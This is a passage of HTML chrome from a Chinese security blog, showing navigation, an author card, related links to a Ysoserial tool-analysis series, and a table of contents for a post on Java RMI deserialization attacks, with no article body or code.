src="/2019/11/05/Ysoserial%E5%B7%A5%E5%85%B7%E8%A7%A3%E8%AF%BB%EF%BC%88%E4%BA%94%EF%BC%89/java_cover.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Ysoserial工具解读（五）</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2019/10/30/Ysoserial工具解读（二）/" title="Ysoserial工具解读（二）"><img class="cover" src="/2019/10/30/Ysoserial%E5%B7%A5%E5%85%B7%E8%A7%A3%E8%AF%BB%EF%BC%88%E4%BA%8C%EF%BC%89/java_cover.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-10-30</div><div class="title">Ysoserial工具解读（二）</div></div></a></div><div><a href="/2019/10/31/Ysoserial工具解读（三）/" title="Ysoserial工具解读（三）"><img class="cover" src="/2019/10/31/Ysoserial%E5%B7%A5%E5%85%B7%E8%A7%A3%E8%AF%BB%EF%BC%88%E4%B8%89%EF%BC%89/java_cover.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-10-31</div><div class="title">Ysoserial工具解读（三）</div></div></a></div><div><a href="/2019/11/05/Ysoserial工具解读（五）/" title="Ysoserial工具解读（五）"><img class="cover" src="/2019/11/05/Ysoserial%E5%B7%A5%E5%85%B7%E8%A7%A3%E8%AF%BB%EF%BC%88%E4%BA%94%EF%BC%89/java_cover.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-11-05</div><div class="title">Ysoserial工具解读（五）</div></div></a></div><div><a href="/2019/10/31/Ysoserial工具解读（四）/" title="Ysoserial工具解读（四）"><img class="cover" src="/2019/10/31/Ysoserial%E5%B7%A5%E5%85%B7%E8%A7%A3%E8%AF%BB%EF%BC%88%E5%9B%9B%EF%BC%89/java_cover.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-10-31</div><div class="title">Ysoserial工具解读（四）</div></div></a></div><div><a href="/2019/03/27/Java反序列化漏洞解析/" title="Java反序列化漏洞解析"><img class="cover" src="/2019/03/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/cover.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-03-27</div><div class="title">Java反序列化漏洞解析</div></div></a></div><div><a href="/2019/10/23/Ysoserial工具解读（一）/" title="Ysoserial工具解读（一）"><img class="cover" src="/2019/10/23/Ysoserial%E5%B7%A5%E5%85%B7%E8%A7%A3%E8%AF%BB%EF%BC%88%E4%B8%80%EF%BC%89/java_cover.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-10-23</div><div class="title">Ysoserial工具解读（一）</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/Mantus.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">L1nf3ng</div><div class="author-info__description">站在更高的角度看安全</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">12</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/L1nf3ng"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/l1nf3ng" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:nuaa_llf@126.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">2021年，继续营业!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RMI%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">1.1.</span> <span class="toc-text">RMI是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.2.</span> <span class="toc-text">代码示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.3.</span> <span class="toc-text">环境搭建</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF"><span class="toc-number">2.</span> <span class="toc-text">利用姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BBServer%E2%80%94%E2%80%94%E6%96%B9%E6%B3%951"><span class="toc-number">2.1.</span> <span class="toc-text">攻击Server——方法1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BBServer%E2%80%94%E2%80%94%E6%96%B9%E6%B3%952"><span class="toc-number">2.2.</span> <span class="toc-text">攻击Server——方法2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BBserver%E2%80%94%E2%80%94%E6%96%B9%E6%B3%953%EF%BC%8C%E6%94%BB%E5%87%BBRegistry"><span class="toc-number">2.3.</span> <span class="toc-text">攻击server——方法3，攻击Registry</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BBClient"><span class="toc-number">2.4.</span> <span class="toc-text">攻击Client</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#YSOSERIAL%E4%B8%AD%E7%9A%84RMI%E7%9B%B8%E5%85%B3%E4%BB%A3%E7%A0%81"><span class="toc-number">3.</span> <span class="toc-text">YSOSERIAL中的RMI相关代码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-JRMPClient-%E2%80%94%E2%80%94-Payloads-JRMPListener"><span class="toc-number">3.1.</span> <span class="toc-text">Exploit&#x2F;JRMPClient —— Payloads&#x2F;JRMPListener</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Payloads-JRMPListener"><span class="toc-number">3.1.1.</span> <span class="toc-text">Payloads&#x2F;JRMPListener</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit-JRMPClient"><span class="toc-number">3.1.2.</span> <span class="toc-text">Exploit&#x2F;JRMPClient </span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-JRMPListener-%E2%80%94%E2%80%94-Payloads-JRMPClient"><span class="toc-number">3.2.</span> <span class="toc-text">Exploit&#x2F;JRMPListener —— Payloads&#x2F;JRMPClient</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Payloads-JRMPClient"><span class="toc-number">3.2.1.</span> <span class="toc-text">Payloads&#x2F;JRMPClient</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit-JRMPListener"><span class="toc-number">3.2.2.</span> <span class="toc-text">Exploit&#x2F;JRMPListener</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">4.</span> <span class="toc-text">References</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/04/03/Tomcat-AJP%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88CVE-2020-1938%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="Tomcat AJP本地文件包含（CVE-2020-1938）漏洞分析"><img src="/2021/04/03/Tomcat-AJP%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88CVE-2020-1938%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/cover.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Tomcat AJP本地文件包含（CVE-2020-1938）漏洞分析"/></a><div class="content"><a class="title" href="/2021/04/03/Tomcat-AJP%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88CVE-2020-1938%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="Tomcat AJP本地文件包含（CVE-2020-1938）漏洞分析">Tomcat AJP本地文件包含（CVE-2020-1938）漏洞分析</a><time datetime="2021-04-03T09:32:53.000Z" title="发表于 2021-04-03 17:32:53">2021-04-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2019/11/19/Ysoserial%E5%B7%A5%E5%85%B7%E8%A7%A3%E8%AF%BB%EF%BC%88%E5%85%AD%EF%BC%89/" title="Ysoserial工具解读（六）"><img src="/2019/11/19/Ysoserial%E5%B7%A5%E5%85%B7%E8%A7%A3%E8%AF%BB%EF%BC%88%E5%85%AD%EF%BC%89/java_cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Ysoserial工具解读（六）"/></a><div class="content"><a class="title" href="/2019/11/19/Ysoserial%E5%B7%A5%E5%85%B7%E8%A7%A3%E8%AF%BB%EF%BC%88%E5%85%AD%EF%BC%89/" title="Ysoserial工具解读（六）">Ysoserial工具解读（六）</a><time datetime="2019-11-19T06:45:24.000Z" title="发表于 2019-11-19 14:45:24">2019-11-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2019/11/05/Ysoserial%E5%B7%A5%E5%85%B7%E8%A7%A3%E8%AF%BB%EF%BC%88%E4%BA%94%EF%BC%89/" title="Ysoserial工具解读（五）"><img src="/2019/11/05/Ysoserial%E5%B7%A5%E5%85%B7%E8%A7%A3%E8%AF%BB%EF%BC%88%E4%BA%94%EF%BC%89/java_cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Ysoserial工具解读（五）"/></a><div class="content"><a class="title" href="/2019/11/05/Ysoserial%E5%B7%A5%E5%85%B7%E8%A7%A3%E8%AF%BB%EF%BC%88%E4%BA%94%EF%BC%89/" title="Ysoserial工具解读（五）">Ysoserial工具解读（五）</a><time datetime="2019-11-05T02:39:59.000Z" title="发表于 2019-11-05 10:39:59">2019-11-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2019/10/31/Ysoserial%E5%B7%A5%E5%85%B7%E8%A7%A3%E8%AF%BB%EF%BC%88%E5%9B%9B%EF%BC%89/" title="Ysoserial工具解读（四）"><img src="/2019/10/31/Ysoserial%E5%B7%A5%E5%85%B7%E8%A7%A3%E8%AF%BB%EF%BC%88%E5%9B%9B%EF%BC%89/java_cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Ysoserial工具解读（四）"/></a><div class="content"><a class="title" href="/2019/10/31/Ysoserial%E5%B7%A5%E5%85%B7%E8%A7%A3%E8%AF%BB%EF%BC%88%E5%9B%9B%EF%BC%89/" title="Ysoserial工具解读（四）">Ysoserial工具解读（四）</a><time datetime="2019-10-31T11:55:49.000Z" title="发表于 2019-10-31 19:55:49">2019-10-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2019/10/31/Ysoserial%E5%B7%A5%E5%85%B7%E8%A7%A3%E8%AF%BB%EF%BC%88%E4%B8%89%EF%BC%89/" title="Ysoserial工具解读（三）"><img src="/2019/10/31/Ysoserial%E5%B7%A5%E5%85%B7%E8%A7%A3%E8%AF%BB%EF%BC%88%E4%B8%89%EF%BC%89/java_cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Ysoserial工具解读（三）"/></a><div class="content"><a class="title" href="/2019/10/31/Ysoserial%E5%B7%A5%E5%85%B7%E8%A7%A3%E8%AF%BB%EF%BC%88%E4%B8%89%EF%BC%89/" title="Ysoserial工具解读（三）">Ysoserial工具解读（三）</a><time datetime="2019-10-31T03:21:05.000Z" title="发表于 2019-10-31 11:21:05">2019-10-31</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2021 By L1nf3ng</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to new land!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>